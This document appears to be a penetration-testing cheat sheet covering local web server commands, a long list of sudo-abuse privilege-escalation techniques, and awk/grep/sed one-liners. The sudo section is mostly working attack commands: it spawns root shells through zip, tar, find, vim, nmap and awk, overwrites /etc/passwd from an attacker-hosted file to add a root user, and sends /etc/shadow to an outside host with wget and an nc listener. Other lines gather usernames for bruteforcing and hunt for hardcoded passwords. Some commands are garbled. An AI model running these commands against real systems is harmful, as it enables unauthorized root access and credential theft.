How To Create an local server
--------------------------------------------
Using Python2
       [ python -m SimpleHTTPServer “port_number” ]
Using Python3
       [ python3 -m http.server ]
Using PHP
       [ php -S localhost:80 ]
Using Ruby
       [ ruby -run -e httpd . -p8000 ]
      -	Using BusyBox
      [ busybox httpd -p 127.0.0.1:8080 -h /var/www/ ]
     *  To Stop The Server
     [ pkill busybox ]
Using Webfsd 
       * Its Doesn’t Come Pre-installed with Linux install It Using 
       [ sudo apt-get install webfs ]
     * To Start Webfs Service
       [ sudo service webfs start ]
Using TFTP
       [ atftpd --daemon --port 69 /tftp ]
Using Nodejs
      *First You Have To Install Http Server in Nodejs To Install Use
       [ npm install -g http-server ]
    *To Start The Http Server Use
        [ http-server -p 80 ]

Exploiting SUDO users : (SUDO Abuse)
--------------------------------------------------------
- Using zip command
   sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
- Using tar command
  sudo tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash
- Using strace command
   sudo strace -o/dev/null /bin/bash
- Using tcpdump command
   echo $’id\ncat /etc/shadow’ > /tmp/.shell
   chmod +x /tmp/.shell
    sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell-Z root
- Using scp command
    sudo scp -S /path/yourscript x y
- Using except command
    sudo except spawn sh then sh
- Using nano command
    sudo nano -S /bin/bash # type your command and hit CTRL+T 
- Using git command
   sudo git help status
   !/bin/bash
   # Using gdb/ftp command
   sudo ftp
   !/bin/sh
- Using Find Command
   sudo find /etc/passwd -exec /bin/sh \;
- or
   sudo find /bin -name nano -exec /bin/sh \;
- Using Vim Command
   sudo vim -c '!sh'
- Using Nmap Command (Old way)
   sudo nmap --interactive
   nmap> !sh
Sh-4.1
- Using Nmap Command (Latest Way without –interactive)
  echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
- Using Man Command
  sudo man man # after that press !sh and hit enter
- Using Less/More Command
  sudo less /etc/hosts
  sudo more /etc/hosts  [ after that press !sh and hit enter]
- Using awk Command
  sudo awk 'BEGIN {system("/bin/sh")}'
- Using nano Command
  sudo nano  /etc/passwd [now switch user password is : test]
  su touhid
- Using wget Command
- [On Attaker Side]
[First Copy Target’s /etc/passwd file to attacker machine. Modify file and add a user in passwd file which is saved in the previous step to the attacker machine. Append this line only ]
=> touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
-Host that passwd file to using any web server.
-[ On Victim Side.]
   sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
[Now switch user password is : test]
  su touhid
  sudo wget --post-file=/etc/shadow 192.168.56.1:8080 [Setup Listener on attacker : nc –lvp 8080]
-Using apache Command
 sudo apache2 -f /etc/shadow
Useful commands
-------------------------------------
List of commands you use most often:
history | awk '{a[$2]++}END{for(i in a) {print a[i] " " i}}' | sort -rn | head
Generate length based wordlists with awk
awk 'length == 10' file.txt > 10-length.txt
Print the 9th line of a file that matches a regex.
awk ‘$9 ~ /404/ { print }’ access.log
Get the usernames from /etc/passwd and dump them into a file for bruteforcing
awk -F':' '{ print $1}' /etc/passwd > users.txt
Sort count and print line occurrences of a file
cat file | sort  | uniq -c | sort -n
Grep a regex and print only matched area
grep -E -o regex file
Remove duplicate entries in a file without sorting
awk '!x[$0]++' filename
Remove empty lines
awk 'NF > 0' filename
alternative:
awk NF filename
Show only first and third words in file
awk '{print $1,$3;}' myfile
Get The Username From /etc/passwd
awk -F':' '{ print $1}' /etc/passwd < users.txt
Clean a wordlist for use with password cracking tools and rules
cat file1.txt | awk '{gsub(/[[:punct:]]/,"")}1' | tr A-Z a-z |sed 's/[0-9]*//g' | sed -e 's/ //g' | strings | tr -cs '[:alpha:]' '\ ' | sed -e 's/ /\n/g' | tr A-Z a-z | sort -u < cleanfile2.txt
Match CVE Numbers
grep -o 'CVE-[0-9]{4}-[0-9]{1,5}'
Match input fields with a hidden input type in an HTML file
grep -io ']*hidden[^<]*<' hidden.csv | sed 's#""#"#g;s#value="[^"]*"#value=""#g' | sort -u | less
Parse IIS Logs for a certain IP ADDRESS (127.0.0.1)
grep 127.0.0.1 *.log | grep -v -e ".gif" -e ".jpg" -e ".ico" -e ".css" -e ".pdf" -e "404" | cut -d' ' -f2,4,5,6,10 | awk '{printf "%s %-04s http://site.com%s?%s  Ref:(%s)n",$1,$2,$3,$4,$5}' | tr -d '-' | sed 's/Ref:()//g' | sed 's/? //g' | awk '{printf "%s %-04s %-70st%sn",$1,$2,$3,$4}' 
Find all links in a file
egrep -IRo '(((http(s)?|ftp|telnet|news|gopher)://|mailto:)[^()<"'''[:space:]]+)'
Generate a random password 30 characters long
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo
Search for a pattern string inside all files in the current directory
grep -RnisI <pattern< *
grep -r <pattern< * .[!.]*
Recursive search and replace old with new string, inside files
grep -rl oldstring . | parallel sed -i -e 's/oldstring/newstring/'
Remove "ssh host" from known hosts file.
echo "${1}" | egrep '^[[:digit:]]*$' ; if [ "$?" -eq 0 ] ; then sed -i "${1}"d
$HOME/.ssh/known_hosts ; else printf "\tYou must enter a number!\n\n" ; exit 1 ; fi
Grep Hardcoded Passwords
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
grep -l -i pass /var/log/*.log 2</dev/null
grep -r "password" .
Filter out URL parameters
sed 's_=[^&]*(&|$)_=1_g'
remove nroff overstrikes (char, backspace) from man pages. The 'echo'
sed "s/.`echo \\\b`//g"
sed 's/.^H//g'
sed 's/.\x08//g'
get Usenet/e-mail message header
sed '/^$/q'
get Usenet/e-mail message body
sed '1,/^$/d'
get Subject header, but remove initial "Subject:"
sed '/^Subject: */!d; s///;q'
get return address header
sed '/^Reply-To:/q; /^From:/h;/./d;g;q'
parse out the address proper. Pulls out the e-mail address by itself
sed 's/ (.)//; s/<.*//;s/.*[:<] *//'
add a leading angle bracket and space to each line (quote a message)
sed 's/^/< /'
delete leading angle bracket & space from each line (unquote a message)
sed 's/^< //'
remove most HTML tags (accommodates multiple-line tags)
sed -e :a -e 's/<[^<]*<//g;/</N;//ba'
extract multi-part uuencoded binaries, removing extraneous header
sed '/^end/,/^begin/d' file1 file2 ... fileX | uudecode
sed '/^end/,/^begin/d' "$@" | uudecode
sort paragraphs of file alphabetically. Paragraphs are separated by blank
sed '/./{H;d;};x;s/\n/={NL}=/g' file | sort | sed '1s/={NL}=//;s/={NL}=/\n/g'
sed '/./{H;d};x;y/\n/\v/' file | sort | sed '1s/\v//;y/\v/\n/'
